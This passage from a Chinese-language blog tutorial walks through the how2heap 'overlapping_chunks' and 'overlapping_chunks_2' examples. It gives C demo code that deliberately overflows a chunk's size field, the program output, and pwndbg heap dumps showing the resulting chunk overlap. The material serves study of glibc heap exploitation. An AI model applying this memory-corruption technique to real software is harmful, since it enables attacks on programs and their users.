0x3232323232323232</span><br><span class="line">0x603140:       0x3232323232323232      0x3232323232323232</span><br><span class="line">0x603150:       0x3232323232323232      0x3232323232323232</span><br><span class="line">pwndbg&gt; x/10gx p3</span><br><span class="line">0x603210:       0x3333333333333333      0x3333333333333333</span><br><span class="line">0x603220:       0x3333333333333333      0x3333333333333333</span><br><span class="line">0x603230:       0x3333333333333333      0x3333333333333333</span><br><span class="line">0x603240:       0x3333333333333333      0x3333333333333333</span><br><span class="line">0x603250:       0x3333333333333333      0x3333333333333333</span><br></pre></td></tr></tbody></table></figure>
<p>这些都没啥好看的,我们直接往下走,此时我们free掉了chunk2,chunk2被放进了unsorted bin中</p>
<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x603100 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x603100</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></tbody></table></figure>
<p>紧接着我们假设我们溢出了chunk1,成功修改了chunk2的size为0x181</p>
<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10gx 0x603100</span><br><span class="line">0x603100:       0x3131313131313131      0x0000000000000181</span><br><span class="line">0x603110:       0x00007ffff7dd1b78      0x00007ffff7dd1b78</span><br><span class="line">0x603120:       0x3232323232323232      0x3232323232323232</span><br><span class="line">0x603130:       0x3232323232323232      0x3232323232323232</span><br><span class="line">0x603140:       0x3232323232323232      0x3232323232323232</span><br></pre></td></tr></tbody></table></figure>
<p>之后程序malloc了p4,此时的堆<br></p><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">0x603000 PREV_INUSE {</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 257,</span><br><span class="line">  fd = 0x3131313131313131,</span><br><span class="line">  bk = 0x3131313131313131,</span><br><span class="line">  fd_nextsize = 0x3131313131313131,</span><br><span class="line">  bk_nextsize = 0x3131313131313131</span><br><span class="line">}</span><br><span class="line">0x603100 PREV_INUSE {</span><br><span class="line">  prev_size = 3544668469065756977,</span><br><span class="line">  size = 385,</span><br><span class="line">  fd = 0x7ffff7dd1b78 &lt;main_arena+88&gt;,</span><br><span class="line">  bk = 0x7ffff7dd1b78 &lt;main_arena+88&gt;,</span><br><span class="line">  fd_nextsize = 0x3232323232323232,</span><br><span class="line">  bk_nextsize = 0x3232323232323232</span><br><span class="line">}</span><br><span class="line">0x603280 PREV_INUSE {</span><br><span class="line">  prev_size = 3689348814741910323,</span><br><span class="line">  size = 134529,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure><p></p>
<p>可以看到我们0x603100也就是p4的size是0x181,此时的p3,p4分别在</p>
<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x p3</span><br><span class="line">$1 = 0x603210</span><br><span class="line">pwndbg&gt; p/x p4</span><br><span class="line">$2 = 0x603110</span><br></pre></td></tr></tbody></table></figure>
<p>而这又意味这什么呢?</p>
<p>我们回想一下,p3的大小是0x100,而p4的大小为0x181,而这两个只相差0x100</p>
<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p/x 0x603210-0x603110</span><br><span class="line">$3 = 0x100</span><br></pre></td></tr></tbody></table></figure>
<p>这样我们就成功的构造了overlapping,也就是说,我们的p4将整个p3都包了进去</p>
<h2 id="总结"><a href="https://nightrainy.github.io/2020/01/20/how2heap%E6%80%BB%E7%BB%93%E7%B3%BB%E5%88%97%E4%B8%89/#%E6%80%BB%E7%BB%93" class="headerlink" title="总结"></a>总结</h2><p>程序先是malloc了2个0x100大小的chunk,p1,p2,和一个大小为0x80的chunk,p3</p>
<p>紧接着,程序初始化了三个chunk,里面的值分别为1,2,3</p>
<p>之后程序free掉了p2,并假设拥有溢出的能力,通过溢出p1修改了p2的size域</p>
<p>此时p2的size是0x181,系统会认为我们有一个大小为0x180的在unsorted bin中的fake chunk</p>
<p>紧接着,我们再申请了一个大小为0x180的chunk p4,这样系统就会把我们unsorted bin中的free chunk也就是我们构造好的大小为0x180的fake chunk拿出来给p4</p>
<p>此时p4的后0x80的空间就和p3共享了,这就构成了overlapping_chunk! 堆重叠</p>
<h1 id="overlapping-chunks-2"><a href="https://nightrainy.github.io/2020/01/20/how2heap%E6%80%BB%E7%BB%93%E7%B3%BB%E5%88%97%E4%B8%89/#overlapping-chunks-2" class="headerlink" title="overlapping_chunks_2"></a>overlapping_chunks_2</h1><p>这里是overlapping的第二个,我们先看看源代码吧</p>
<h2 id="源代码-1"><a href="https://nightrainy.github.io/2020/01/20/how2heap%E6%80%BB%E7%BB%93%E7%B3%BB%E5%88%97%E4%B8%89/#%E6%BA%90%E4%BB%A3%E7%A0%81-1" class="headerlink" title="源代码"></a>源代码</h2><p>我删除了一些无关语句,并加了一些注释(理解不对的地方多包涵2333</p>
<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">#include &lt;stdlib.h&gt;</span><br><span class="line">#include &lt;string.h&gt;</span><br><span class="line">#include &lt;stdint.h&gt;</span><br><span class="line">#include &lt;malloc.h&gt;</span><br><span class="line"></span><br><span class="line">int main(){</span><br><span class="line"></span><br><span class="line">  intptr_t *p1,*p2,*p3,*p4,*p5,*p6;</span><br><span class="line">  unsigned int real_size_p1,real_size_p2,real_size_p3,real_size_p4,real_size_p5,real_size_p6;</span><br><span class="line">  int prev_in_use = 0x1;</span><br><span class="line"></span><br><span class="line">  //这个也被称为不相邻的free chunk conslidation 攻击(这里就不强翻了,没呢味儿</span><br><span class="line">  fprintf(stderr, "\nThis is also referenced as Nonadjacent Free Chunk Consolidation Attack\n");</span><br><span class="line">  fprintf(stderr, "\nLet's start to allocate 5 chunks on the heap:");</span><br><span class="line"></span><br><span class="line">  p1 = malloc(1000);</span><br><span class="line">  p2 = malloc(1000);</span><br><span class="line">  p3 = malloc(1000);</span><br><span class="line">  p4 = malloc(1000);</span><br><span class="line">  p5 = malloc(1000);</span><br><span class="line"></span><br><span class="line">  //malloc_usable_size函数可以获取chunk实际分配的内存大小</span><br><span class="line">  real_size_p1 = malloc_usable_size(p1);</span><br><span class="line">  real_size_p2 = malloc_usable_size(p2);</span><br><span class="line">  real_size_p3 = malloc_usable_size(p3);</span><br><span class="line">  real_size_p4 = malloc_usable_size(p4);</span><br><span class="line">  real_size_p5 = malloc_usable_size(p5);</span><br><span class="line"></span><br><span class="line">  fprintf(stderr, "\n\nchunk p1 from %p to %p", p1, (unsigned char *)p1+malloc_usable_size(p1));</span><br><span class="line">  fprintf(stderr, "\nchunk p2 from %p to %p", p2,  (unsigned char *)p2+malloc_usable_size(p2));</span><br><span class="line">  fprintf(stderr, "\nchunk p3 from %p to %p", p3,  (unsigned char *)p3+malloc_usable_size(p3));</span><br><span class="line">  fprintf(stderr, "\nchunk p4 from %p to %p", p4, (unsigned char *)p4+malloc_usable_size(p4));</span><br><span class="line">  fprintf(stderr, "\nchunk p5 from %p to %p\n", p5,  (unsigned char *)p5+malloc_usable_size(p5));</span><br><span class="line"></span><br><span class="line">  //为了便于看攻击效果,所以五个chunk分别为A,B,C,D,E</span><br><span class="line">  memset(p1,'A',real_size_p1);</span><br><span class="line">  memset(p2,'B',real_size_p2);</span><br><span class="line">  memset(p3,'C',real_size_p3);</span><br><span class="line">  memset(p4,'D',real_size_p4);</span><br><span class="line">  memset(p5,'E',real_size_p5);</span><br><span class="line"></span><br><span class="line">  //我们现在Free一下p4,在有p5邻接top chunk的情况下,我们释放p4不会引起p4与top chunk的合并</span><br><span class="line">  fprintf(stderr, "\nLet's free the chunk p4.\nIn this case this isn't coealesced with top chunk since we have p5 bordering top chunk after p4\n");</span><br><span class="line"></span><br><span class="line">  free(p4);</span><br><span class="line"></span><br><span class="line">  //现在我们通过溢出chunk p1将chunk p2的size改成p2+p3的大小并且将标注为设为正在使用来触发漏洞</span><br><span class="line">  fprintf(stderr, "\nLet's trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2\nwith the size of chunk_p2 + size of chunk_p3\n");</span><br><span class="line"></span><br><span class="line">  *(unsigned int *)((unsigned char *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + sizeof(size_t) * 2; //&lt;--- BUG HERE</span><br><span class="line"></span><br><span class="line">  现在我们再free p2,这个时候ptmalloc就会认为下一个chunk是p4(p2的size已经被我们更改为p2+p3的大小了</span><br><span class="line">  fprintf(stderr, "\nNow during the free() operation on p2, the allocator is fooled to think that \nthe nextchunk is p4 ( since p2 + size_p2 now point to p4 ) \n");</span><br><span class="line">  </span><br><span class="line">  //这样就会创建一个大的错误包含p3的free chunk</span><br><span class="line">  fprintf(stderr, "\nThis operation will basically create a big free chunk that wrongly includes p3\n");</span><br><span class="line">  free(p2);</span><br><span class="line"></span><br><span class="line">  //现在我们再创建一个新的大小正好是我们创建的fake free chunk的新chunk</span><br><span class="line">  fprintf(stderr, "\nNow let's allocate a new chunk with a size that can be satisfied by the previously freed chunk\n");</span><br><span class="line"></span><br><span class="line">  p6 = malloc(2000);</span><br><span class="line">  real_size_p6 = malloc_usable_size(p6);</span><br><span class="line"></span><br><span class="line">  fprintf(stderr, "\nOur malloc() has been satisfied by our crafted big free chunk, now p6 and p3 are overlapping and \nwe can overwrite data in p3 by writing on chunk p6\n");</span><br><span class="line">  fprintf(stderr, "\nchunk p6 from %p to %p", p6,  (unsigned char *)p6+real_size_p6);</span><br><span class="line">  fprintf(stderr, "\nchunk p3 from %p to %p\n", p3, (unsigned char *) p3+real_size_p3);</span><br><span class="line"></span><br><span class="line">  fprintf(stderr, "\nData inside chunk p3: \n\n");</span><br><span class="line">  fprintf(stderr, "%s\n",(char *)p3);</span><br><span class="line"></span><br><span class="line">  fprintf(stderr, "\nLet's write something inside p6\n");</span><br><span class="line">  memset(p6,'F',1500);</span><br><span class="line"></span><br><span class="line">  fprintf(stderr, "\nData inside chunk p3: \n\n");</span><br><span class="line">  fprintf(stderr, "%s\n",(char *)p3);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">}</span><br></pre></td></tr></tbody></table></figure>
<h2 id="程序运行结果"><a href="https://nightrainy.github.io/2020/01/20/how2heap%E6%80%BB%E7%BB%93%E7%B3%BB%E5%88%97%E4%B8%89/#%E7%A8%8B%E5%BA%8F%E8%BF%90%E8%A1%8C%E7%BB%93%E6%9E%9C" class="headerlink" title="程序运行结果"></a>程序运行结果</h2><figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">chunk p1 from 0x220f010 to 0x220f3f8</span><br><span class="line">chunk p2 from 0x220f400 to 0x220f7e8</span><br><span class="line">chunk p3 from 0x220f7f0 to 0x220fbd8</span><br><span class="line">chunk p4 from 0x220fbe0 to 0x220ffc8</span><br><span class="line">chunk p5 from 0x220ffd0 to 0x22103b8</span><br><span class="line"></span><br><span class="line">Let's free the chunk p4.</span><br><span class="line">In this case this isn't coealesced with top chunk since we have p5 bordering top chunk after p4</span><br><span class="line"></span><br><span class="line">Let's trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2</span><br><span class="line">with the size of chunk_p2 + size of chunk_p3</span><br><span class="line"></span><br><span class="line">Now during the free() operation on p2, the allocator is fooled to think that</span><br><span class="line">the nextchunk is p4 ( since p2 + size_p2 now point to p4 )</span><br><span class="line"></span><br><span class="line">This operation will basically create a big free chunk that wrongly includes p3</span><br><span class="line"></span><br><span class="line">Now let's allocate a new chunk with a size that can be satisfied by the previously freed chunk</span><br><span class="line"></span><br><span class="line">Our malloc() has been satisfied by our crafted big free chunk, now p6 and p3 are overlapping and</span><br><span class="line">we can overwrite data in p3 by writing on chunk p6</span><br><span class="line"></span><br><span class="line">chunk p6 from 0x220f400 to 0x220fbd8</span><br><span class="line">chunk p3 from 0x220f7f0 to 0x220fbd8</span><br><span class="line"></span><br><span class="line">Data inside chunk p3:</span><br><span class="line"></span><br><span class="line">CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC</span><br><span class="line"></span><br><span class="line">Let's write something inside p6</span><br><span class="line"></span><br><span class="line">Data inside chunk p3:</span><br><span class="line"></span><br><span class="line">FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC</span><br></pre></td></tr></tbody></table></figure>
<h2 id="关键部分调试"><a href="https://nightrainy.github.io/2020/01/20/how2heap%E6%80%BB%E7%BB%93%E7%B3%BB%E5%88%97%E4%B8%89/#%E5%85%B3%E9%94%AE%E9%83%A8%E5%88%86%E8%B0%83%E8%AF%95" class="headerlink" title="关键部分调试"></a>关键部分调试</h2><p>因为和之前的很类似,这里我仅下几个断点</p>
<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">  28   p2 = malloc(1000);</span><br><span class="line">  29   p3 = malloc(1000);</span><br><span class="line">  30   p4 = malloc(1000);</span><br><span class="line">  31   p5 = malloc(1000);</span><br><span class="line">  32</span><br><span class="line">► 33   real_size_p1 = malloc_usable_size(p1);</span><br><span class="line"></span><br><span class="line">  53   free(p4);</span><br><span class="line">  54</span><br><span class="line">► 55   fprintf(stderr, "\nLet's trigger the vulnerability on chunk p1 that overwrites the size of the in use chunk p2\nwith the size of chunk_p2 + size of chunk_p3\n");</span><br><span class="line"></span><br><span class="line">  57   *(unsigned int *)((unsigned char *)p1 + real_size_p1 ) = real_size_p2 + real_size_p3 + prev_in_use + sizeof(size_t) * 2; //&lt;--- BUG HERE</span><br><span class="line">  58</span><br><span class="line">► 59   fprintf(stderr, "\nNow during the free() operation on p2, the allocator is fooled to think that \nthe nextchunk is p4 ( since p2 + size_p2 now point to p4 ) \n");</span><br><span class="line">  </span><br><span class="line">  61   free(p2);</span><br><span class="line">  62</span><br><span class="line">► 63   fprintf(stderr, "\nNow let's allocate a new chunk with a size that can be satisfied by the previously freed chunk\n");</span><br><span class="line"></span><br><span class="line">  65   p6 = malloc(2000);</span><br><span class="line">► 66   real_size_p6 = malloc_usable_size(p6);</span><br></pre></td></tr></tbody></table></figure>
<p> 好了我们先运行一下分配下5个chunk</p>
 <figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"> pwndbg&gt; heap</span><br><span class="line">0x603000 PREV_INUSE {</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 1009,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">}</span><br><span class="line">0x6033f0 PREV_INUSE {</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 1009,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">}</span><br><span class="line">0x6037e0 PREV_INUSE {</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 1009,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">}</span><br><span class="line">0x603bd0 PREV_INUSE {</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 1009,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">}</span><br><span class="line">0x603fc0 PREV_INUSE {</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 1009,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">}</span><br><span class="line">0x6043b0 PREV_INUSE {</span><br><span class="line">  prev_size = 0,</span><br><span class="line">  size = 130129,</span><br><span class="line">  fd = 0x0,</span><br><span class="line">  bk = 0x0,</span><br><span class="line">  fd_nextsize = 0x0,</span><br><span class="line">  bk_nextsize = 0x0</span><br><span class="line">}</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></tbody></table></figure>
<p>可以看到已经分配了5个堆块p1,p2,p3,p4,p5</p>
<p>分别从0x603000,0x6033f0,0x6037e0,0x603bd0,0x603fc0,0x6043b0处开始</p>
<p>然后我们继续运行一下,free掉p2,此时</p>
<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; bins</span><br><span class="line">fastbins</span><br><span class="line">0x20: 0x0</span><br><span class="line">0x30: 0x0</span><br><span class="line">0x40: 0x0</span><br><span class="line">0x50: 0x0</span><br><span class="line">0x60: 0x0</span><br><span class="line">0x70: 0x0</span><br><span class="line">0x80: 0x0</span><br><span class="line">unsortedbin</span><br><span class="line">all: 0x603bd0 —▸ 0x7ffff7dd1b78 (main_arena+88) ◂— 0x603bd0</span><br><span class="line">smallbins</span><br><span class="line">empty</span><br><span class="line">largebins</span><br><span class="line">empty</span><br></pre></td></tr></tbody></table></figure>
<p>此时的chunk p2</p>
<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10gx 0x6033f0</span><br><span class="line">0x6033f0:       0x4141414141414141      0x00000000000003f1</span><br><span class="line">0x603400:       0x4242424242424242      0x4242424242424242</span><br><span class="line">0x603410:       0x4242424242424242      0x4242424242424242</span><br><span class="line">0x603420:       0x4242424242424242      0x4242424242424242</span><br><span class="line">0x603430:       0x4242424242424242      0x4242424242424242</span><br><span class="line">pwndbg&gt; p/x 0x3f1</span><br><span class="line">$4 = 0x3f1</span><br><span class="line">pwndbg&gt; p 0x3f1</span><br><span class="line">$5 = 1009</span><br></pre></td></tr></tbody></table></figure>
<p>可以看到其size此时为0x3f1,而pre_size为chunk1所复用,紧接着我们继续,程序现在已经更改了chunk p2的size域</p>
<figure class="highlight plain"><table><tbody><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/10gx 0x6033f0</span><br><span class="line">0x6033f0:       0x4141414141414141      0x00000000000007e1</span><br><span class="line">0x603400:       0x4242424242424242      0x4242424242424242</span><br><span class="line">0x603410:       0x4242424242424242      0x4242424242424242</span><br><span class="line">0x603420:       0x4242424242424242      0x4242424242424242</span><br><span class="line">0x603430:       0x4242424242424242      0x4242424242424242</span><br><span class="line">pwndbg&gt;</span><br></pre></td></tr></tbody></table></figure>
<p>好了,现在我们free掉chunk2并malloc一个新的chunk p6</p>
